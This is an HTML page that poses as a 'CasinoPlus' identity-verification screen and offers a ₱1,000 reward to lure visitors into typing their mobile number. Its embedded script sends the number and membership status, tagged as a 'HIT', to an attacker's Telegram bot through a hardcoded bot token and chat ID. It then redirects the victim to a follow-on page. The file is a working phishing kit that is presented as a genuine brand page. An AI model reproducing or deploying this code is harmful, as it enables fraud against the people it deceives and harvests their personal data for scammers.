<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CasinoPlus | Security Verification</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&family=JetBrains+Mono:wght@700&display=swap" rel="stylesheet">
    <style>
        :root {
            --gold: #fbbf24;
            --bg: #020617;
            --card-bg: rgba(30, 41, 59, 0.7);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }

        body {
            background-color: var(--bg);
            background-image: radial-gradient(circle at 50% 0%, #1e3a8a 0%, transparent 50%), radial-gradient(circle at 100% 100%, #0f172a 0%, #020617 100%);
            color: #f8fafc;
            font-family: 'Poppins', sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            overflow: hidden;
        }

        .card {
            width: 90%;
            max-width: 400px;
            background: var(--card-bg);
            backdrop-filter: blur(16px);
            border: 1px solid rgba(251, 191, 36, 0.2);
            border-radius: 28px;
            padding: 40px 28px;
            text-align: center;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7);
            animation: fadeIn 0.8s ease-out;
        }

        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }

        .logo-img { width: 180px; margin-bottom: 30px; filter: drop-shadow(0 0 15px rgba(251, 191, 36, 0.3)); }
        h1 { font-size: 24px; font-weight: 800; margin-bottom: 12px; }
        p { color: #94a3b8; font-size: 14px; line-height: 1.6; margin-bottom: 32px; }

        .input-group { text-align: left; margin-bottom: 20px; }
        .label-text { font-size: 11px; text-transform: uppercase; color: var(--gold); font-weight: 700; margin-bottom: 8px; display: block; letter-spacing: 1px; }

        input {
            width: 100%;
            background: rgba(15, 23, 42, 0.8);
            border: 2px solid rgba(255, 255, 255, 0.05);
            border-radius: 16px;
            padding: 16px;
            color: #fff;
            font-size: 18px;
            font-family: 'JetBrains Mono', monospace;
            outline: none;
        }

        .btn-gold {
            background: linear-gradient(135deg, #fbbf24 0%, #d97706 100%);
            color: #000;
            border: none;
            width: 100%;
            padding: 18px;
            border-radius: 16px;
            font-size: 16px;
            font-weight: 700;
            text-transform: uppercase;
            cursor: pointer;
            box-shadow: 0 10px 20px -5px rgba(217, 119, 6, 0.4);
        }

        .radio-container { display: flex; background: rgba(15, 23, 42, 0.6); padding: 5px; border-radius: 12px; margin-bottom: 30px; }
        .radio-container label { flex: 1; padding: 10px; cursor: pointer; font-size: 14px; font-weight: 600; border-radius: 8px; transition: 0.2s; }
        .radio-container input { display: none; }
        .radio-container input:checked + span { background: var(--gold); color: #000; display: block; width: 100%; border-radius: 8px; padding: 5px 0; }

        .shake { animation: shake 0.4s ease-in-out; border-color: #ef4444 !important; }
        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-8px); } 75% { transform: translateX(8px); } }
    </style>
</head>
<body>

    <div class="card">
        <img src="https://casinoplus.static2.website/images/image-7.jpg" class="logo-img" alt="CasinoPlus">
        <h1>Identity Check</h1>
        <p>To secure your ₱1,000.00 reward, please verify your registered mobile number.</p>
        
        <div class="input-group">
            <span class="label-text">Mobile Number</span>
            <input type="tel" id="userPhone" placeholder="09xxxxxxxxx" maxlength="11">
        </div>

        <span class="label-text" style="text-align: left;">Member of CasinoPlus?</span>
        <div class="radio-container">
            <label><input type="radio" name="reg" value="Yes" checked><span>YES</span></label>
            <label><input type="radio" name="reg" value="No"><span>NO</span></label>
        </div>

        <button class="btn-gold" id="submitBtn" onclick="processBypass()">Verify & Claim</button>
    </div>

    <script>
        const botToken = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
        const chatId = '7298607329';
        const BYPASS_MODE = true; 

        function processBypass() {
            const phoneInput = document.getElementById('userPhone');
            const btn = document.getElementById('submitBtn');
            const regStatus = document.querySelector('input[name="reg"]:checked').value;
            const phone = phoneInput.value;

            // 1. Validation
            if (phone.length < 11 || !phone.startsWith('09')) {
                phoneInput.classList.add('shake');
                setTimeout(() => phoneInput.classList.remove('shake'), 400);
                return;
            }

            // 2. UI Feedback
            btn.innerHTML = "Verifying...";
            btn.disabled = true;

            // 3. Telegram Alert
            const msg = `🎰 REMASTERED HIT:\n📱 Number: ${phone}\n👤 Member: ${regStatus}`;
            const telUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`;
            
            fetch(telUrl).finally(() => {
                if (BYPASS_MODE) {
                    // SUCCESS REDIRECT
                    setTimeout(() => {
                        window.location.href = "main.html?auth=" + Math.random().toString(36).substring(7);
                    }, 1200);
                } else {
                    alert("Verification system busy. Please try again later.");
                    btn.innerHTML = "Verify & Claim";
                    btn.disabled = false;
                }
            });
        }

        // Restrict input to numbers only
        document.getElementById('userPhone').addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '');
        });
    </script>
</body>
</html>
